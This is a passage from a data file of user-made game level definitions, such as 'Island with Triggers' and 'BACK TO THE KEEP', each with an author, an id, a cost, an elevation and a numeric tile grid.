13,13,1,133,13,13,13,1,133,13,13,13,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,13,13,13,137,1,13,13,13,134,1,13,13,13,134,1,0,0,0,0,1,13,13,13,13,1,13,13,13,13,1,13,13,13,13,1,0,13,13,13,13,13,13,13,13,1,13,13,13,13,1,13,13,13,13,1,0,13,13,13,13,13,13,13,13,1,136,13,13,13,1,136,13,13,13,1,0,13,13,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Island with Triggers",author="TF2 Pencil",id="#1660800894",direction="right",cost=530,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,0,0,0,13,13,66,66,66,66,66,66,66,66,66,66,66,66,66,66,13,0,0,0,13,13,66,72,73,73,73,73,73,73,73,73,73,73,73,66,13,0,0,0,13,13,66,72,74,74,74,74,74,74,74,74,74,72,71,66,13,0,0,0,13,13,66,72,71,66,66,66,66,66,66,66,66,72,71,66,13,0,0,0,13,13,66,72,71,66,13,13,13,13,13,13,66,72,71,66,13,0,0,0,13,13,66,72,71,66,13,23,23,23,23,13,66,72,71,66,13,0,0,0,13,13,66,72,71,66,13,23,97,97,23,3,66,72,71,66,13,96,2,0,13,13,66,72,71,66,13,23,97,97,23,3,66,72,71,66,13,96,2,0,13,13,66,72,71,66,13,23,23,23,23,13,66,72,71,66,13,0,0,0,13,13,66,72,71,66,13,13,13,13,13,13,66,72,71,66,13,0,0,0,13,13,66,72,71,66,66,66,66,66,66,66,66,72,71,66,13,0,0,0,13,13,66,72,71,73,73,73,73,73,73,73,73,73,71,66,13,0,0,0,13,13,66,74,74,74,74,74,74,74,74,74,74,74,71,66,13,0,0,0,13,13,66,66,66,66,66,66,66,66,66,66,66,66,66,66,13,0,0,0,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Slowly going down",author="TF2 Pencil",id="#1660808433",direction="forward",cost=460,elevation=-19,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,130,130,20,20,130,130,130,130,130,130,130,130,130,130,130,130,130,0,24,24,130,130,20,20,130,130,130,130,130,130,130,130,130,130,130,130,130,0,24,24,130,130,130,130,130,130,16,16,130,130,130,130,130,130,130,130,130,0,24,24,130,130,130,130,130,130,16,16,130,130,130,130,130,130,130,130,130,0,24,24,130,130,20,20,130,130,130,130,130,130,12,12,130,130,8,8,130,0,24,24,130,130,20,20,130,130,130,130,130,130,12,12,130,130,8,8,130,0,0,0,130,130,130,130,130,130,16,16,130,130,130,130,130,130,130,130,130,0,0,0,130,130,130,130,130,130,16,16,130,130,130,130,130,130,130,130,130,0,0,0,130,130,20,20,130,130,130,130,130,130,12,12,130,130,8,8,130,0,0,0,130,130,20,20,130,130,130,130,130,130,12,12,130,130,8,8,130,0,0,0,130,130,130,130,130,130,16,16,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,0,130,130,16,16,130,130,130,130,130,130,130,130,130,0,0,0,0,0,0,0,130,130,130,130,130,130,12,12,130,130,8,8,5,5,0,0,0,0,0,0,130,130,130,130,130,130,12,12,130,130,8,8,5,5,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,130,130,5,5,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,130,130,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2]});
maps.push({name="Triggering Room",author="TF2 Pencil",id="#1660808543",direction="right",cost=388,elevation=0,map=[2,2,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,9,9,0,1,97,9,0,29,0,29,1,130,130,130,130,24,102,1,0,0,9,9,0,1,9,9,0,0,0,0,1,130,17,130,130,24,24,1,0,0,9,9,0,1,0,0,0,29,0,29,1,130,17,130,130,130,130,1,0,0,9,9,0,1,0,0,0,0,0,0,1,130,17,130,130,130,130,1,0,0,9,9,0,1,0,29,0,29,0,29,1,130,130,130,17,17,130,1,0,0,9,9,0,1,0,0,0,0,0,0,1,130,130,130,130,130,130,1,0,0,9,9,0,1,0,29,0,29,0,9,1,9,130,130,130,130,130,1,0,0,9,9,0,1,1,1,1,1,1,9,1,9,1,1,1,1,1,1,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,96,98,101,103,9,9,2,9,9,9,9,9,9,9,9,9,9,9,9,9,96,98,101,103,9,9,2,0,0,0,1,1,1,1,1,1,9,1,9,1,1,1,1,1,1,0,0,0,0,0,1,9,9,9,9,9,9,1,9,10,11,12,13,13,1,0,0,0,0,0,1,76,76,76,76,76,76,1,9,9,9,9,9,14,1,0,0,0,0,0,1,9,9,9,9,9,9,1,9,9,9,9,9,15,1,0,0,0,0,0,1,76,76,76,76,76,76,1,16,16,9,16,16,16,1,0,0,0,0,0,1,9,9,9,9,9,9,1,17,9,9,1,1,1,1,0,0,0,0,0,1,76,76,76,76,76,76,1,18,9,9,9,19,19,1,0,0,0,0,0,1,99,9,9,9,9,9,1,19,9,19,9,19,104,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0]});
maps.push({name="hey i know this one",author="fara",id="#1660816821",direction="right",cost=275,elevation=7,map=[0,0,0,0,2,2,31,31,32,32,33,33,34,34,35,35,0,0,0,0,0,0,0,0,30,30,31,31,32,32,33,33,34,34,35,35,0,0,0,0,0,0,0,0,29,29,28,28,38,38,37,37,36,36,35,35,0,0,0,0,0,0,0,0,29,29,28,28,38,38,37,37,36,36,35,35,0,0,0,0,0,0,0,0,24,24,24,24,58,58,24,24,24,24,0,0,0,0,0,0,0,0,0,0,24,100,24,24,58,58,24,24,100,24,0,0,0,0,0,0,0,0,0,0,24,24,24,24,58,58,24,24,24,24,0,0,0,0,0,0,29,29,38,38,18,18,18,18,58,58,18,18,18,18,0,0,0,0,0,0,29,29,38,38,18,18,18,18,58,58,18,18,18,18,38,38,37,37,37,2,30,30,38,38,18,18,18,18,58,58,18,18,18,18,38,38,37,37,37,2,30,30,38,38,18,18,18,18,58,58,18,18,18,18,0,0,0,0,0,0,31,31,37,37,19,19,18,18,58,58,18,18,19,19,0,0,0,0,0,0,31,31,37,37,20,20,18,18,58,58,18,18,20,20,0,0,0,0,0,0,32,32,36,36,21,21,18,18,58,58,18,18,21,21,0,0,0,0,0,0,32,32,36,36,22,22,18,18,58,58,18,18,22,22,0,0,0,0,0,0,33,33,35,35,23,23,18,18,58,58,18,18,23,23,0,0,0,0,0,0,33,33,35,35,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,34,34,34,34,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,34,34,34,34,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,34,34,34,34,24,24,24,24,100,24,24,24,24,24,0,0,0,0,0,0]});
maps.push({name="i know this one too",author="fara",id="#1660818384",direction="left",cost=149,elevation=14,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,27,27,28,28,29,29,30,30,31,31,32,32,33,33,0,0,0,0,26,26,27,27,28,28,29,29,30,30,31,31,32,32,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,3,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,24,24,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,24,93,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,23,23,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,22,22,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,21,21,2,40,40,40,40,40,40,40,40,40,40,40,20,20,20,20,20,20,20,20,2,40,40,40,40,40,40,40,40,40,40,40,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,42,0,0,0]});
maps.push({name="rng trigger",author="fara",id="#1660820923",direction="forward",cost=402,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,2,2,0,0,1,132,1,132,1,132,1,132,1,132,1,132,1,132,1,0,14,14,0,0,1,14,96,14,96,14,96,14,96,14,96,14,96,14,1,0,14,90,0,0,1,131,96,131,96,131,96,133,96,131,96,131,96,131,1,0,14,14,0,0,1,1,96,1,96,1,96,1,96,1,96,1,96,1,1,0,90,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,14,14,14,90,14,14,14,90,14,14,14,14,86,14,14,14,14,24,24,0,14,14,14,14,14,86,14,14,14,14,90,14,14,14,14,14,14,137,24,0,90,14,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,14,14,0,22,100,22,22,0,0,24,0,0,24,24,24,24,24,24,24,0,14,14,0,22,97,22,0,0,23,0,24,0,0,24,24,24,24,24,24,0,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,14,86,14,14,14,14,14,86,14,90,14,14,14,14,14,14,90,14,0,0,14,14,14,14,90,14,14,14,14,14,14,88,14,14,127,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,14,0,1,96,1,96,1,96,1,96,1,96,1,96,1,96,1,130,0,14,14,0,1,134,1,134,1,134,1,134,1,134,1,134,1,134,1,0,0,14,90,0,1,14,1,14,1,14,1,14,1,14,1,14,1,14,1,130,0,14,14,0,1,133,1,133,1,133,1,133,1,133,1,133,1,136,1,24,0,14,14,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,131,24,2,2,0]});
maps.push({name="Lazy River",author="Block",id="#1660826442",direction="forward",cost=622,elevation=-19,map=[24,2,2,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,24,24,24,24,1,14,14,13,13,12,12,11,11,10,10,9,9,9,9,9,24,24,24,24,1,14,74,74,74,74,74,74,74,74,74,74,74,72,72,8,24,70,70,24,1,15,74,74,74,74,74,74,74,74,74,74,74,72,72,8,24,70,70,24,1,15,71,71,1,1,1,1,1,1,1,1,1,72,72,8,24,72,72,24,1,15,71,71,73,73,73,73,73,18,17,16,1,72,72,8,24,72,72,24,1,16,71,71,73,73,73,73,73,18,0,15,1,72,72,7,23,72,72,24,1,16,16,17,17,17,18,69,69,18,0,14,1,72,72,7,23,72,72,23,1,1,1,1,1,0,18,69,69,18,0,13,1,72,72,7,23,72,72,23,23,23,23,23,1,0,18,69,69,18,0,12,1,72,72,7,23,74,74,74,74,72,72,22,1,0,18,69,69,18,0,11,1,72,72,6,23,74,74,74,74,72,72,21,1,0,18,69,69,18,0,10,1,72,72,6,23,22,22,22,22,72,72,21,1,0,18,69,69,18,0,9,1,72,72,6,0,1,1,1,22,72,72,20,1,0,18,69,69,18,1,8,1,72,72,6,0,0,0,1,22,74,74,74,74,74,74,71,71,18,1,7,1,72,72,5,38,0,0,1,22,74,74,74,74,74,74,71,71,18,1,6,1,72,72,5,0,0,0,1,22,21,21,21,20,20,19,19,19,18,1,5,5,66,66,5,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,5,5,5,5,5,34,0,0,31,30,29,29,29,28,27,27,27,26,26,0,5,5,5,5,5,0,0,0,31,30,30,29,29,28,28,27,27,26,26,0,5,5,5,2,2]});
maps.push({name="strafe practice v2",author="fara",id="#1660828426",direction="forward",cost=295,elevation=0,map=[22,22,2,2,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,86,22,23,24,135,135,135,135,135,135,135,135,135,135,135,135,0,0,22,22,22,22,23,24,135,135,135,135,135,135,135,135,135,135,135,135,0,0,22,21,22,0,23,24,135,135,135,135,135,135,135,135,135,135,135,135,0,0,90,22,22,22,21,23,0,0,0,0,0,0,0,0,0,0,130,0,0,0,22,22,22,22,87,22,0,0,0,0,0,0,0,0,0,0,130,0,0,0,0,22,21,90,22,22,0,0,0,0,0,0,0,0,0,0,130,0,0,0,22,22,22,22,22,22,0,0,0,0,0,0,0,0,0,0,130,0,0,0,22,86,22,22,22,22,0,0,0,0,0,0,0,0,0,0,130,0,0,0,22,22,22,21,22,22,0,0,0,0,0,0,0,0,0,0,130,0,0,0,22,21,22,22,22,86,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,22,22,22,0,22,0,0,67,0,0,0,0,0,133,11,19,11,133,0,22,22,22,22,22,22,41,41,21,67,0,0,0,0,67,19,39,19,67,0,22,22,87,21,22,22,41,134,41,0,0,0,0,67,20,39,39,39,20,67,22,22,22,22,22,22,41,94,41,0,0,0,0,0,39,39,93,39,39,0,0,22,22,22,90,22,41,132,41,0,0,0,0,0,39,39,39,39,39,0,22,21,22,22,22,22,41,41,21,67,0,0,0,0,39,39,131,39,39,0,22,22,22,22,22,22,0,0,67,0,0,0,0,67,20,39,39,39,20,67,22,22,2,2,22,22,0,0,0,0,0,0,0,0,67,0,0,0,67,0]});
maps.push({name="spxs high heels",author="spxctator",id="#1660828564",direction="left",cost=260,elevation=7,map=[0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,15,15,15,15,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,15,15,15,15,15,15,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,15,15,15,15,15,15,1,0,0,0,0,0,0,0,0,0,0,1,22,132,1,15,15,15,15,15,1,0,0,0,0,0,0,0,0,0,1,22,22,22,1,15,15,15,15,15,15,1,0,0,0,0,0,0,0,1,22,22,22,1,15,15,15,15,15,15,15,1,0,0,0,0,0,0,1,22,22,22,22,1,15,15,15,15,15,15,15,1,0,0,0,0,0,1,22,22,22,22,1,15,15,15,15,15,15,15,1,0,0,0,0,0,1,22,22,22,22,1,15,15,15,15,15,15,1,1,0,0,1,1,1,1,22,22,22,22,1,15,15,15,15,15,15,1,0,0,0,0,62,62,96,22,22,22,22,1,15,15,15,15,15,1,1,0,0,0,0,0,2,62,96,22,22,22,1,15,15,15,15,15,1,0,0,0,0,0,0,0,2,62,96,22,22,1,15,15,15,15,15,1,1,1,1,1,1,1,1,0,62,62,96,22,1,134,15,15,15,15,15,15,15,15,15,15,15,91,94,1,1,1,1,133,1,15,15,15,15,15,15,15,15,15,15,15,15,91,97,1,0,0,0,1,1,15,15,15,15,15,15,15,15,15,1,1,1,1,1,0,0,0,0,0,1,131,15,15,15,15,15,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,15,15,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trappy hilly billy",author="Luffaren",id="#1660831571",direction="right",cost=187,elevation=19,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,85,5,85,5,5,85,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,85,5,5,85,5,5,0,0,0,0,0,0,0,0,0,0,0,0,6,85,6,6,85,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,7,7,85,7,7,7,85,7,0,0,0,0,0,0,0,0,0,0,0,0,8,85,8,8,85,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,9,9,85,9,9,85,9,9,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,85,10,10,10,85,0,0,0,0,0,0,0,0,0,0,0,0,11,85,11,11,85,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,12,12,85,12,12,12,85,12,0,0,0,0,0,0,0,0,0,0,0,0,85,13,13,13,85,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,14,14,85,14,14,14,85,14,0,0,0,0,0,0,0,0,0,0,0,0,35,85,35,85,35,35,35,35,122,122,122,123,124,85,0,0,0,0,0,0,36,36,36,36,85,36,85,36,122,85,122,85,85,124,0,0,0,0,0,0,36,85,36,37,38,39,40,41,42,122,122,123,124,124,0,0,0,0,0,0,36,36,36,85,38,85,40,85,42,122,85,123,124,2,0,0,0,0,0,0,85,36,36,37,85,39,40,41,42,122,122,123,124,2,0,0,0,0,0,0,0,0,0,0,38,39,85,41,85,122,122,85,124,124,0,0,0,0,0,0,0,0,0,0,0,39,40,41,42,122,122,123,124,85]});
maps.push({name="under and over",author="fara",id="#1660845002",direction="left",cost=274,elevation=6,map=[0,67,0,12,2,2,12,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,100,21,0,25,25,25,25,0,67,0,0,0,0,0,0,0,12,13,12,0,21,21,0,21,25,25,21,0,20,0,19,67,0,67,0,0,11,11,11,0,0,67,0,25,25,25,25,0,0,0,0,0,0,17,0,0,11,132,11,0,0,0,0,25,25,25,25,0,0,0,0,18,0,15,67,0,11,11,11,0,0,0,25,16,25,25,12,25,0,67,12,14,0,0,0,11,90,11,67,0,0,25,25,25,25,25,25,25,25,0,0,0,0,0,11,11,11,11,0,0,11,11,45,11,45,45,11,45,11,11,11,11,11,11,11,90,11,11,0,0,2,11,45,11,45,45,11,45,90,11,11,11,11,86,11,88,11,11,0,0,2,11,45,11,45,45,11,45,11,11,11,87,90,86,11,11,11,11,0,0,11,11,45,11,45,45,11,45,11,11,11,11,11,11,11,11,90,11,0,0,0,25,25,25,25,25,25,25,25,0,0,0,0,0,90,11,11,11,0,0,0,0,25,19,25,25,12,25,0,0,0,0,0,0,0,11,11,11,67,0,0,0,0,25,88,25,25,0,0,0,0,0,0,12,0,0,11,11,11,0,0,67,0,25,25,25,25,0,67,0,0,0,67,13,0,0,11,132,11,0,21,21,0,20,25,25,20,0,19,0,0,0,0,0,0,0,11,11,11,0,100,21,0,25,25,25,25,0,0,0,18,0,0,0,15,0,12,13,12,0,21,21,0,25,25,25,25,0,0,67,17,0,16,0,67,0,0,0,0,0,0,67,0,9,131,131,11,0,0,0,0,0,67,0,0,0,0,0,0,0]});
maps.push({name="criss cross",author="fara",id="#1660847268",direction="forward",cost=354,elevation=18,map=[23,23,5,2,2,5,128,23,135,135,135,135,0,0,0,0,0,128,23,1,127,23,5,5,5,5,23,0,0,0,0,0,0,0,0,0,0,0,23,23,11,11,45,45,45,45,11,11,86,11,10,11,11,11,11,11,88,11,11,11,132,11,45,45,45,45,11,11,11,10,86,11,11,11,10,11,11,11,11,133,132,11,45,45,45,45,11,88,11,11,11,11,11,86,11,11,11,11,11,133,11,11,45,45,45,45,11,11,11,11,11,11,10,11,11,11,10,11,11,11,34,34,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,67,23,23,23,23,23,23,67,0,0,0,126,23,0,5,5,5,5,0,0,0,23,23,137,137,23,23,0,0,0,0,23,23,0,5,5,5,5,0,0,67,23,23,23,23,23,23,67,0,0,0,130,23,0,5,5,5,5,0,0,0,0,23,23,23,23,0,0,0,0,0,130,100,0,5,5,5,5,0,0,0,0,23,23,23,23,0,0,0,0,0,130,23,0,3,3,3,3,0,0,0,0,23,23,23,23,130,130,130,130,130,130,129,23,11,11,11,11,23,23,23,23,23,23,23,23,0,0,0,0,0,0,17,17,51,51,51,51,17,17,17,17,57,57,57,57,17,17,90,17,17,17,134,17,51,51,51,51,17,90,17,17,57,57,57,57,17,17,17,17,17,136,134,17,51,51,51,51,17,17,88,17,57,57,57,57,17,90,17,17,17,136,17,17,51,51,51,51,17,17,17,17,57,57,57,57,17,17,17,90,17,17,0,0,11,11,11,11,0,0,0,0,23,23,23,23,0,0,0,0,0,0,1,0,11,131,131,11,0,0,0,0,23,2,2,23,0,0,0,0,0,1]});
maps.push({name="generic interior",author="fara",id="#1660848848",direction="forward",cost=280,elevation=0,map=[0,0,0,0,0,0,0,18,52,2,2,52,18,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,52,52,52,52,18,18,18,18,0,0,0,0,0,0,0,0,18,91,52,52,52,52,52,52,52,52,91,18,0,0,0,0,0,0,0,0,18,52,91,52,52,52,89,52,52,91,52,18,0,0,0,0,0,0,0,0,18,52,52,18,18,52,52,18,18,52,52,18,0,0,0,0,0,0,0,0,18,52,52,18,18,52,52,18,18,52,52,18,0,0,0,0,0,0,0,0,18,52,52,52,52,52,52,52,52,52,52,18,0,0,0,0,0,0,0,18,18,52,52,52,52,52,52,52,52,52,52,18,18,0,0,0,0,0,0,18,18,95,95,18,18,52,52,18,18,95,95,18,18,0,0,0,0,0,18,18,52,52,52,18,18,95,95,18,18,52,52,52,18,18,0,0,0,0,18,52,52,89,52,52,18,52,52,18,52,52,52,52,52,18,0,0,0,0,18,52,52,52,52,52,52,52,89,52,52,52,52,52,52,18,0,0,0,0,18,52,52,18,18,18,52,52,52,52,18,18,18,52,52,18,0,0,0,0,18,52,52,52,52,52,52,91,91,52,52,52,52,89,52,18,0,0,0,0,18,18,52,52,52,52,52,91,91,52,52,52,52,52,18,18,0,0,0,0,0,18,18,18,91,18,52,52,52,52,18,91,18,18,18,0,0,0,0,0,0,0,0,18,52,52,52,52,52,52,52,52,18,0,0,0,0,0,0,0,0,0,0,18,18,52,52,52,52,52,52,18,18,0,0,0,0,0,0,0,0,0,0,0,18,18,95,95,95,95,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,18,52,2,2,52,18,0,0,0,0,0,0,0]});
maps.push({name="BACK TO THE KEEP",author="fara",id="#1660853459",direction="forward",cost=323,elevation=12,map=[0,0,0,0,0,0,0,0,0,5,5,5,2,2,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,6,5,5,5,1,0,0,0,0,0,0,0,0,0,5,5,5,5,6,6,6,6,5,5,1,0,0,0,0,0,0,0,0,5,5,5,5,5,7,7,7,6,6,6,1,0,0,0,0,0,0,0,5,5,5,5,5,7,8,8,8,8,8,7,1,0,0,0,0,0,0,5,5,5,5,5,17,17,9,9,9,17,17,17,1,0,0,0,0,0,5,5,5,5,5,17,15,15,49,49,49,15,15,15,1,0,0,0,0,5,5,5,5,5,17,15,15,15,49,49,49,15,15,15,1,1,5,5,5,5,5,5,5,17,15,15,11,10,9,9,9,9,49,15,1,1,5,5,5,5,5,5,17,15,15,12,11,10,9,9,9,9,49,9,1,1,12,6,12,12,12,17,15,15,13,12,11,11,10,24,24,24,15,24,1,1,10,7,10,10,10,17,15,14,13,13,12,24,24,22,22,22,55,22,1,1,10,7,10,10,10,17,15,14,14,24,24,22,22,22,17,15,15,15,1,1,7,7,7,7,9,17,15,14,14,22,22,22,21,19,15,15,15,15,1,1,7,7,7,7,11,17,15,14,14,15,15,15,15,15,15,15,15,15,1,1,7,7,7,7,13,17,14,14,14,15,15,15,15,15,15,15,15,15,1,1,8,8,8,7,14,14,14,14,14,15,15,15,15,15,15,15,15,15,1,1,1,1,1,1,1,1,1,1,1,1,20,20,20,16,16,16,16,20,1,0,0,0,0,0,0,0,0,0,0,1,20,20,20,17,17,17,17,20,1,0,0,0,0,0,0,0,0,0,0,1,20,20,20,18,2,2,18,20,1]});
maps.push({name="Turnabout",author="Luffaren",id="#1660876989",direction="left",cost=405,elevation=19,map=[0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,1,1,1,1,1,67,67,67,67,0,5,5,5,5,0,67,67,67,67,67,1,124,94,124,1,24,24,24,24,90,5,5,90,5,24,24,24,24,24,24,1,93,94,93,1,2,24,89,24,24,24,5,5,24,24,24,89,24,24,90,1,124,124,124,1,2,24,24,24,24,24,5,5,24,24,24,24,24,24,24,1,1,95,1,1,24,24,24,24,90,5,90,5,5,24,90,24,24,24,24,90,24,24,24,90,0,0,0,0,0,5,5,5,5,0,0,0,0,24,89,24,24,24,24,24,67,67,67,67,0,5,5,5,5,0,67,67,0,24,24,24,24,24,24,24,10,10,10,10,11,1,45,45,1,11,11,11,11,24,24,24,90,24,24,24,10,10,89,10,11,45,89,45,45,11,11,89,11,0,0,0,23,23,23,23,10,89,10,10,11,45,45,45,45,11,11,11,11,67,0,0,22,22,22,22,10,10,10,10,11,1,45,45,1,11,11,11,11,67,0,0,21,21,21,21,10,10,10,10,0,5,5,5,5,11,11,11,11,67,0,0,20,20,20,20,9,9,9,9,0,5,5,5,5,11,11,11,11,0,0,0,19,19,19,19,8,8,8,8,0,5,5,89,5,12,12,12,12,0,0,0,18,18,18,18,7,7,7,7,0,5,5,5,5,13,13,13,13,0,0,0,17,17,17,17,7,7,7,7,6,5,89,5,5,14,14,14,90,14,15,16,17,17,17,17,7,7,7,7,6,5,5,5,5,14,14,14,14,14,15,16,17,17,89,17,90,7,7,7,6,5,5,89,5,14,14,14,14,14,15,16,17,89,17,17,90,7,7,7,6,5,5,5,5,90,14,90,14,14,15,16,17,17,17,17]});
maps.push({name="GFhoLd",author="Niikos",id="#1660879248",direction="forward",cost=167,elevation=-8,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,34,34,34,34,34,34,34,0,0,0,0,0,0,0,0,0,34,34,34,34,34,34,34,34,34,34,34,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,34,34,0,0,97,40,40,0,0,34,34,0,0,0,0,0,0,0,0,0,34,34,0,0,0,40,0,0,0,34,34,0,0,0,0,0,0,0,0,0,34,34,0,0,0,38,38,36,36,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,96,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,96,30,30,30,30,30,30,30,30,30,30,0,0,0,0,0,0,0,0,0,0,30,30,30,30,30,30,30,30,30,30,0,0,0,0,0,0,0,0,0,0,30,30,0,0,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,0,0,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,0,0,30,30,98,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,0,0,98,98,98,0,0,0,0,0,0,0,0,99,30,0,0,0,92,30,0,0,98,26,26,26,26,26,26,26,26,26,0,0,0,0,0,0,0,0,0,0,98,26,26,26,26,26,26,26,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="HoldThisL",author="Niikos",id="#1660879798",direction="forward",cost=159,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,54,129,54,54,54,54,54,54,54,54,54,54,54,54,54,54,0,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,127,54,54,0,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,0,129,54,54,54,54,54,54,54,129,54,54,54,54,54,54,54,54,54,54,0,0,0,0,0,0,0,0,92,1,0,0,0,0,0,0,0,54,54,127,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,54,54,54,93,94,93,54,54,54,54,54,54,1,0,0,0,0,0,0,0,54,54,54,94,93,94,54,54,54,54,54,54,1,0,0,0,0,0,0,0,2,2,0]});
